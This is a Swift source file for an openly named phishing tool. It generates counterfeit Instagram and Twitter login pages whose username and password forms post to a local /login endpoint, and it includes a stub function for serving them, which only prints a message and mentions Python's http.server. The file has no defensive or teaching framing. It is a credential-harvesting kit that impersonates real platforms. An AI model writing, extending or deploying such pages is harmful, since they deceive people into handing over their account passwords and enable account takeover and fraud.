import Foundation

class TemplateGenerator {
    func generatePhishingPage(platform: String) -> String {
        let templates = [
            "instagram": """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Instagram Login</title>
                <style>
                    body { font-family: Arial; background: #fafafa; }
                    .login-box { width: 300px; margin: 100px auto; text-align: center; }
                    input { width: 100%; padding: 10px; margin: 10px 0; }
                    button { background: #0095f6; color: white; border: none; padding: 10px; width: 100%; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h1>Instagram</h1>
                    <form action="/login" method="POST">
                        <input type="text" name="username" placeholder="Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </body>
            </html>
            """,
            "twitter": """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Twitter Login</title>
                <style>
                    body { font-family: Arial; background: white; }
                    .login-box { width: 300px; margin: 100px auto; text-align: center; }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
                    button { background: #1da1f2; color: white; border: none; padding: 10px; width: 100%; }
                </style>
            </head>
            <body>
                <div class="login-box">
                    <h1>Twitter</h1>
                    <form action="/login" method="POST">
                        <input type="text" name="username" placeholder="Username" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit">Log In</button>
                    </form>
                </div>
            </body>
            </html>
            """
        ]

        return templates[platform] ?? ""
    }

    func startPhishingServer(port: Int = 8080) {
        // In a real tool, this would use a local HTTP server (e.g., Python's http.server or a Swift HTTP library)
        print("Starting phishing server on port \(port)...")
        // Example: `python3 -m http.server \(port)`
    }
}
